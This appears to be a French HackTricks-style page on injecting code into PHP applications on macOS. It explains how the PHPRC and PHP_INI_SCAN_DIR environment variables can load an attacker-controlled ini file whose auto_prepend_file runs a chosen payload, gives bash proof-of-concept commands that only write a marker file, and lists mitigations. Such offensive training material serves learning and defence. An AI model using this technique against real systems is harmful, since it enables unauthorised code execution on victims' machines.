# Injection dans les applications PHP de macOS

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` et `auto_prepend_file`

PHP CLI et CGI lisent la configuration à chaque invocation. `PHPRC` peut sélectionner un `php.ini` lisible par l’attaquant, tandis que `PHP_INI_SCAN_DIR` peut rediriger le répertoire analysé pour rechercher des fichiers `.ini` supplémentaires. La directive `auto_prepend_file` force PHP à analyser un fichier avant le script demandé ; cette combinaison permet donc l’exécution de code au démarrage.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
Une autre possibilité est un répertoire contenant un fichier `.ini` :
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
L’option `-n` ignore `php.ini` ; un chemin `-c` de confiance explicite est prioritaire sur `PHPRC`. N’oubliez pas qu’un SAPI serveur persistant lit normalement la configuration au démarrage du serveur web, tandis que CLI et CGI le font à chaque invocation.<sup>[[1]](#references)</sup>

## References

- [1] [Fichier de configuration PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
